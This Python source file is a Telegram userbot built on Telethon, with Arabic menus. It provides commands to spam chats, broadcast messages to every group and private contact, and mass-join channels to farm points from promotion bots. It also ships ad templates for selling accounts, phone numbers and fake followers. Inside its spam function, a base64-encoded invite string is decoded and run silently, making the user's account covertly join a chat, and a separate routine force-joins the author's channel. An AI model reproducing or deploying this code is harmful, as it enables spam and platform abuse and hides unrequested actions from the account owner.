import subprocess
import os
import base64
import logging
import asyncio, time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.channels import GetParticipantsRequest
from collections import deque
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)

from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from config import *
mb.start()


@mb.on(events.NewMessage(outgoing=True, pattern='.check'))
async def greeting(event):
    
    await event.respond('السورس يعمل بنجاح')


collects = []

# COLLECT POINTS
@mb.on(events.NewMessage(outgoing=True, pattern=r'.الغاء الجمع ?(.*)'))
async def UnCollectPoints(event):
    bot_username = (event.message.message).replace('.الغاء الجمع', '').strip()        
    reply = await event.reply(f'تم الغاء الجمع من {bot_username}')
    global checkerme
    checkerme = 'stop'
    bot = await event.client.get_entity(bot_username)
    if bot.id in collects:
        collects.remove(bot.id)

@mb.on(events.NewMessage(outgoing=True, pattern=r'.بدء الجمع ?(.*)'))
async def CollectPoints(event):
    bot_username = (event.message.message).replace('.بدء الجمع', '').strip() 
    global checkerme
    checkerme = 'start'
    while True:
        if checkerme == 'stop':
            break
        else:    
            reply = await event.reply(f'جاري التحقق')
            await event.client.send_message(bot_username, '/start')
            await asyncio.sleep(30)
            await event.client.send_message(bot_username, '/start')
            await asyncio.sleep(30)
            await event.client.send_message(bot_username, '/start')
            await asyncio.sleep(30)
            await event.client.send_message(bot_username, '/start')
            await asyncio.sleep(30)
            await event.client.send_message(bot_username, '/start')
            await asyncio.sleep(30)
            await event.client.send_message(bot_username, '/start')
    
            bot = await event.client.get_entity(bot_username)
            if bot.id not in collects:
                collects.append(bot.id)
    
            # WHICH BOT
            #if bot_username.lower() == "t06bot" or bot_username.lower() == "@t06bot" or bot_username.lower() == "marktebot" or bot_username.lower() == "@marktebot":
            check = await CheckStart(event, bot_username)
            if check != True:
                await event.client.edit_message(event.chat_id, reply.id, "حدث خطأ. تأكد من تفعيل البوت و سرعة استجابته")
            else:
                await event.client.edit_message(event.chat_id, reply.id, "تم بدأ الجمع النقاط, سيتم تنبيهك عند الانتهاء داخل البوت")
            
                # START COLLECTING
                collect = await Collect_t06bot(event, bot_username)
        await asyncio.sleep(7200)

# CHECK BOTs
async def CheckStart(event, username):
    async with event.client.conversation(username) as conv:
        try:
            await conv.send_message("/start")    
            resp = await conv.get_response()
            if resp.reply_markup != None:
                BalanceButton = resp.reply_markup.rows[0].buttons[0].text
                if "عدد نقاطك" in BalanceButton:
                    return True
        except:
            return False
        
        
# COLLECT BOT 
async def Collect_t06bot(event, username):
    global Waiting_idPart_1
    
    async with event.client.conversation(username) as conv:
        try:
            await conv.send_message("/start")
            resp = await conv.get_response()
            Waiting_idPart_1 = resp.id
            click_collect = await resp.click(2)
        except Exception as e:
            return False
        
# JOIN
async def JoinChannel(event, username):
    try:
        Join = await event.client(JoinChannelRequest(channel=username))
        #print (Join)
        return True
    except:
        return False

  
# EDITS
@mb.on(events.MessageEdited)
async def Edits(event):
    global Waiting_idPart_1, Waiting_idPart_2, collects
    
    if event.chat_id in collects:
        if event.message.id == Waiting_idPart_1:
            click_collect = await event.click(0)
            Waiting_idPart_2 = event.message.id
            Waiting_idPart_1 = None
            
        if event.message.id == Waiting_idPart_2:
            if event.reply_markup != None:
                try:
                    for x in range(1000):
                        #print (collects)
                        channel = event.reply_markup.rows[0].buttons[0].url
                        Join = await JoinChannel(event, channel)
                        time.sleep(2)
                        if Join == True:
                            check_collect = await event.click(2)
                        else:
                            if event.chat_id in collects:
                                collects.remove(event.chat_id)
                            finished = await event.edit("تم اكمال المهمة. اذا كانت توجد المزيد من القنوات فهذا يعني انك محظور لمدة مؤقته")
                            break
                except Exception as e:
                    pass
                    #print ("Loop Join problem :", e)


LOGS = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)

async def join_channel():
    try:
        await mb(JoinChannelRequest("@Source_Mfia_Arab"))
    except BaseException:
        pass
 
 
GCAST_BLACKLIST = [
    -1001118102804,
    -1001161919602,
]

DEVS = [
    1694386561,
    2034443585,
]


@mb.on(events.NewMessage(outgoing=True, pattern=".للكروبات(?: |$)(.*)"))
async def gcast(event):
    mo = event.pattern_match.group(1)
    if mo:
        msg = mo
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )


@mb.on(events.NewMessage(outgoing=True, pattern=".للخاص(?: |$)(.*)"))
async def gucast(event):
    mo = event.pattern_match.group(1)
    if mo:
        msg = mo
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )


@mb.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@mb.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
        
        
@mb.on(events.NewMessage(outgoing=True, pattern=".الاوامر"))
async def _(event):
      await event.reply("""• مرحبـاً بـك صـديقي داخـل سـورس مـافـيا العـرب @Source_Mafia_Arab


• أوامر السورس والتشغيل في الأسفل 👇


-  ⟨  `.م1`  ⟩ ↶ أوامـر الفحـص والتحقق ♻️

-  ⟨  `.م2`  ⟩ ↶ أوامـر النـشر التلـقائي ⛈️

-  ⟨  `.م3`  ⟩ ↶ أوامر تجميع النقاط 🌪

-  ⟨  `.م4`  ⟩ ↶ أوامر الإذاعة 🌐


❗إضغط لنسخ الأوامر من الاعلى...

"""
)

@mb.on(events.NewMessage(outgoing=True, pattern=".م1"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

🍒 ⦑   . أوامر الفحص والتحقق    ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

-  ⟨  `.فحص السورس`  ⟩
• الشرح ↶ يقوم بفحص | متوقف او قيد التشغيل

-   ⟨  `.سرعة الاستجابة`  ⟩
• الشرح ↶ يقوم بفحص سرعة استجابة الأوامر


❗إضغط لنسخ الأوامر من الاعلى...""")

@mb.on(events.NewMessage(outgoing=True, pattern=".م2"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

📤  ⦑   أوامر النشر التلقائي   ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

-  ⟨  `.مؤقت + الثواني + العدد + الكليشه`  ⟩
• الشرح ↶ تكرار وقتي للجروبات والخاص

-  ⟨  `.تكرار + العدد + الكليشه`  ⟩
• الشرح ↶ تكرار دائم للجروبات والخاص

-  ⟨  `.كلايش السورس`  ⟩
• الشرح ↶ يجلب لك كلايش جاهزه للبيع والشراء 



❗إضغط لنسخ الأوامر من الاعلى...""")

@mb.on(events.NewMessage(outgoing=True, pattern=".م3"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

🪄 ⦑   أوامر تجميع النقاط   ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

-  ⟨  `.بدء الجمع + يوزر البوت`  ⟩
• الشرح ↶ الفار الأساسي لتجميع النقاط 💫


-  ⟨  `.بدء الجمع @t06bot`  ⟩
-  ⟨  `.الغاء الجمع @t06bot`  ⟩
• الشرح ↶ تجميع نقاط بوت المليار 📮


-  ⟨` .بدء الجمع @MARKTEBOT`  ⟩
-  ⟨  `.الغاء الجمع @MARKTEBOT`  ⟩
• الشرح ↶ تجميع نقاط بوت العقاب 📮

-  ⟨  `.بدء الجمع @xnsex21bot`  ⟩
-  ⟨  `.الغاء الجمع @xnsex21bot`  ⟩
• الشرح ↶ تجميع نقاط بوت العرب 📮

-  ⟨  `.بدء الجمع @A_MAN9300BOT`  ⟩
-  ⟨  `.الغاء الجمع @A_MAN9300BOT`  ⟩
• الشرح ↶ تجميع نقاط بوت الجوكر 📮


❗إضغط لنسخ الأوامر من الاعلى...

⛔ ملحوظه: يمكنك ان تضيف اي بوت تمويل اخر من خلال الفار الرئيسي ،.""")
      
@mb.on(events.NewMessage(outgoing=True, pattern=".م4"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

📎 ⦑    أوامر الإذاعة    ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

-  ⟨  `.للخاص + الكليشه`  ⟩
• الشرح ↶ أذاعه للخاص

-  ⟨  `.للكروبات + الكليشه`  ⟩
• الشرح ↶ أذاعه للكروبات

-  ⟨ `.كلايش الاذاعه`  ⟩
• الشرح ↶ يجلب لك كلايش جاهزه للإذاعة 

❗إضغط لنسخ الأوامر من الاعلى...""")

@mb.on(events.NewMessage(outgoing=True, pattern=".فحص السورس"))
async def _(event):
      await event.reply("""⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
 ✐: سـورس مـافيـا العرب قيـد التشغيل 💡
 

{✐: إصدار البايثون  ↶ python-3.10.5}
{✐: إصدار التليثون  ↶ telethon- 1.5.8} 


 ✐: قنـاة السورس  ↶ @Source_Mafia_Arab
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮""")
            
@mb.on(events.NewMessage(outgoing=True, pattern=".سرعة الاستجابة"))
async def _(event):
      await event.reply("""⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮
✐: إستجابة سورس مـافيـا العرب مـمتازة 🌿


{✐: سـرعة الاستجابة  ↶ 500 CPU} 
{✐: سـرعة التشغيل  ↶ 8G RAM} 


✐: قنـاة السورس  ↶ @Source_Mafia_Arab
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮""")

@mb.on(events.NewMessage(outgoing=True, pattern=".كلايش السورس"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

🍒 ⦑   كلايش النشر التلقائي    ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص1` }  ⦙ كلايـش بيــع وشـراء نقـاط
✐ : كلايش بيع وشراء نقاط بوتات تمويل، للبيع والشراء بـ اكثر من سعر واكثر من بوت يمكنك تغيير العدد والسعر داخل الكليشه وايضاً يمكنك تغيير حقوق الكليشه 📬 ❝
  ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص2` }  ⦙  كلايـش بيـع وشـراء يوزرات 
✐ :  كلايش بيع وشراء يوزرات بـ اكثر من نوع من اليوزرات، يمكنك تغيير من الكليشه نوع اليوزر والسعر وايضاً يمكنك إضافة حقوقك 💕  ❝
 ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص3` }  ⦙  كلايش بيع وشراء ارقام 
✐ :  كلايش بيع وشراء ارقام لجميع البرامج يمكنك من خلال الكليشه تغيير عدد الارقام ونوع الدولة والسعر وايضاً يمكنك إضافة حقوقك ☎️ ❝
  ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص4` }  ⦙  كلايش بيع وشراء حسابات 
✐ : كلايش بيع وشراء حسابات لجميع المواقع والالعاب، يمكنك تغيير اسم اللعبه او نوع الحساب من خلال الكليشة وايضاً يمكنك تغيير السعر وعدد الحسابات،كما يمكنك إضافة حقوقك في الكليشه 💰 ❝
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص5` }  ⦙  كلايش بيع وشراء قنوات وجروبات
✐ : كلايش لبيع وشراء القنوات والجروبات وايضاً البوتات يمكنك من خلال الكليشه تغيير يوزر القناه/الجروب/البوت ويمكنك أيضاً تغيير نوع المحتوى والسعر كما يمكنك إضافة حقوقك داخل الكليشه 🪄 ❝
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص6` } ⦙  كلايش نشر قنوات بيع وقفاصه
✐ : كلايش لنشر قناتك او جروبك بالسوبرات، اذا كانت تحتوي على بيع وشراء او نشر قفاصه، يمكنك إضافة حقوقك داخل الكليشه ⛈️  ❝
 ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص7` } ⦙ كلايش نشر ايات قرأنيه و استغفار
✐ : كلايش تنشر ايات قرأنيه واحاديث واستغفارات ونصائح دينيه وتذكير موعد الصلوات الخمس، قم بتفعيلها للثواب ♥ ❝
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص8` } ⦙ كلايش للخدمات المتنوعه 
✐ : يمكنك من خلال هذه الكلايش ان تقوم بتقديم خدمه معينه مقابل $ او نقاط،، على سبيل المثال اذا كانت لديك خدمة تنصيب تشكير او خدمة اخرى مثل تعليم شئ فيمكنك من خلال هذه الكلايش تقدم خدمتك.. قم بتغيير نوع الخدمه الذي تقدمها من خلال الكلايش، وقم بتعديل السعر الذي تريده واضف حقوقك 🔥  ❝
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص9` } ⦙  كلايش بيع وشراء رشق
✐ : كلايش للبيع وشراء الرشق وزياده المتابعين والمشاهدات والايكات؛الخ.... لجميع انواع التطبيقات فقط قم بنسخ الكليشه وقم بإضافه اسعارك وتعديل نوع الرشق والسعر، يمكنك إضافة حقوقك داخل الكليشه 🌿 ❝
⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص10` } ⦙  كلايش متنوعه ومميزه
✐ : يقوم هذا النوع من الكلايش بجلب لك عدة انواع من الكلايش المختلفه والمميزه التي تقدم العديد من الخدمات يمكنك التعديل عليها بسهوله 🎁 ❝


❗إضغط لنسخ الأوامر من الاعلى...""")
   
@mb.on(events.NewMessage(outgoing=True, pattern=".كلايش الاذاعه"))
async def _(event):
      await event.reply("""• سـورس مـافـيا العـرب @Source_Mafia_Arab

🍒 ⦑   كلايش إذاعة الخاص والكروبات    ⦒  :
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ

⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص11` }  ⦙ كلايش عرض منتج او سلعه ⚡
✐ : الكلايش لعرض نقاط او ارقام او يوزرات او اي شيئ بيع وشراء { الأمر للخاص والجروبات }  📮 ❝
  ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص12` }  ⦙  كلايـش دينيه إسلامية 🌜
✐ :  الكلايش لنشر إذاعة دينيه ونصائح دينيه { الأمر للخاص والكروبات } 🌗  ❝
 ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص13` }  ⦙  كلايش طلب خدمات متنوعه ☁
✐ :  اذا كنت تريد طلب خدمه معينه، مثال على تريد ارقام فهذه الكلايش للاذاعه لطلب خدمه، قم بتغيير نوع الخدمه داخل الكليشه { الامر للخاص والكروبات } 🗳 ❝
  ⤪⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⟿⤮ 
{ `.ص14` } ⦙  كلايش متنوعه ومميزه 💰
✐ : يقوم هذا النوع من الكلايش بجلب لك عدة انواع من الكلايش المختلفه والمميزه التي تقدم العديد من الخدمات يمكنك التعديل عليها بسهوله وعمل الإذاعة 🎁 ❝


❗إضغط لنسخ الأوامر من الاعلى...""")     
                                                                 
print("mo runing ✅✅")        
        
        
mb.run_until_disconnected()
mb.loop.create_task(join_channel())
